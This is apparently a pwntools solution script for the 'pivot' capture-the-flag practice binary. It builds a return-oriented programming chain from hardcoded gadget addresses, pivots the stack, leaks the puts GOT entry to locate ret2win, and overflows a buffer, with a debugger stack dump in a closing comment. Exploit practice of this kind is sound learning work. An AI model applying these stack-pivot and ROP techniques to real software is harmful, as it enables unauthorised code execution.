from pwn import *

#target = process("./pivot")
target = gdb.debug("./pivot", "b * pwnme")
pop_rdi = p64(0x0000000000400a33)
pop_rax = p64(0x4009bb)
xchg = p64(0x4009bd) # xchg rax, rsp
mov = p64(0x4009c0) # mov rax, [rax]
add = p64(0x4009c4) # add rax, rbp
ret = p64(0x04006b6) 
puts = p64(0x04006e0)
main = p64(0x0400847)
puts_got = p64(0x601020)

target.recvuntil(b"pivot: ")
addr = p64(int(target.recvuntil(b"\n").strip(b"\n"), 16))

payload = mov
payload += pop_rdi 
payload += puts_got
payload += puts
payload += ret
payload += main
target.sendline(payload)
sleep(5)
payload = b""
payload += b"A" * 40

payload += pop_rax
payload += addr
payload += xchg

target.recvuntil(b"you!\n")
#print(payload)
target.sendline(payload)
sleep(5)
target.recvuntil(b"you!")


leak = int.from_bytes(target.recvn(8).strip()[::-1])
ret2win = leak + 0x378ea1 # to get from puts to ret2win

payload =  b"A" * 40
payload += p64(ret2win)
target.recvuntil(b"smash")
target.sendline(payload)
sleep(5)
#target.sendline(payload)
target.interactive()

'''
0x7ffcf80243a0: 0x4141414141414141      0x4141414141414141
0x7ffcf80243b0: 0x4141414141414141      0x4141414141414141
0x7ffcf80243c0: 0x4141414141414141      0x00000000004009bb
0x7ffcf80243d0: 0x00007c09cc3fef10      0x00000000004009bd
0x7ffcf80243e0: 0x00007ffcf8024480      0x00007c09cc42a1ca <- libc.so.6
address already in rdi

 0x00007c09cc605710

'''